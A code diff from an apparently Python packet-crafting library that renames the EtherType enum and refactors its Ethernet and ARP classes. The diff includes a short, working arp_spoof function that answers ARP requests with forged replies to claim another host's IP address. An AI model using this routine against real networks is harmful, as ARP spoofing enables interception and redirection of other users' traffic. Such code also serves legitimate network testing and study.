@@ -17,16 +17,16 @@ class IPAddr(StringSZ):
 	def _repr(self): return '.'.join(["%d"%(ord(x)) for x in self.value])
 
 ArpOp=Enum.mk("? REQ REPL",ShortBE,"ArpOp")
-EtherType=Enum.mk("",ShortBE,"EtherType",ARP=0x806,IP=0x800)
+EType=Enum.mk("",ShortBE,"EType",ARP=0x806,IP=0x800)
 
 class ARP(BasePacketClass):
 	_fields_=AttrList(
-		('hwtype',ShortBE),("prottype",EtherType),
+		('hwtype',ShortBE),("prottype",EType),
 		("hwsize",Byte),("protsize",Byte), ("opcode",ArpOp),
 		("hw_src",MacAddr),("prot_src",IPAddr),("hw_dst",MacAddr),("prot_dst",IPAddr))
 	__slots__=_fields_.keys()+["oui"]
 	@classmethod
-	def new(cls,**attrs): return cls(**dict(dict(hwtype=1,prottype=EtherType("IP"),hwsize=6,protsize=4),**attrs))
+	def new(cls,**attrs): return cls(**dict(dict(hwtype=1,prottype=EType("IP"),hwsize=6,protsize=4),**attrs))
 
 LLCOUI=Enum.mk("",Int,"LLCOUI",cisco=0x0c,apple=0x80007)
 
@@ -42,14 +42,13 @@ class LLC(BasePacketClass):
 	@classmethod
 	def new_cdp(cls,**attrs): return cls.new_snap(**dict(dict(oui_h=0,oui_l=0xc,type=0x2000),**attrs))
 
-
 class Ether(BasePacketClass):
 	def choose_data(self,data,offset=None,size=None):
 		if self.type&0x0800:
 			try: return StringSZ._c(size=self._data_size-self._offsetof("data"))
 			except AttributeError: return StringSZ
 		else: return LLC._c(size=int(self.type))
-	_fields_=AttrList(("dst",MacAddr),("src",MacAddr),("type",EtherType),("data",[({"type":0x0806},ARP),({},choose_data)]),("trailer",StringSZ,""))
+	_fields_=AttrList(("dst",MacAddr),("src",MacAddr),("type",EType),("data",[({"type":0x0806},ARP),({},choose_data)]),("trailer",StringSZ,""))
 	__slots__=_fields_.keys()
 	def get_type(self): return len(self.data)
 	def _repr(self): return "%s -> %s (0x%x)"%(self.src._repr(),self.dst._repr(),self.type)
@@ -71,9 +70,9 @@ class PktHandler(DynamicAttrClass):
 		self.s(data)
 		return self.r(**cond)
 
-def arp_spoof(pkth,ip,mac=None):
-	if mac is None: mac=pkth.sock.mac
-	req=pkth.r(data__opcode=ArpOp("REQ"),data__prot_dst=IPAddr(ip))
-	repl=Ether(src=mac,dst=req.data.hw_src,type=0x806,data=ARP.new(opcode="REPL",hw_src=mac,hw_dst=req.data.hw_src,prot_src=ip,prot_dst=req.data.prot_src))
-	pkth.s(repl)
+def arp_spoof(ethsock,ip,mac=None):
+	if mac is None: mac=ethsock.sock.mac
+	req=ethsock.r(data__opcode=ArpOp("REQ"),data__prot_dst=IPAddr(ip))
+	repl=Ether(src=mac,dst=req.data.hw_src,type=EType("ARP"),data=ARP.new(opcode="REPL",hw_src=mac,hw_dst=req.data.hw_src,prot_src=ip,prot_dst=req.data.prot_src))
+	ethsock.s(repl)
 	return repl
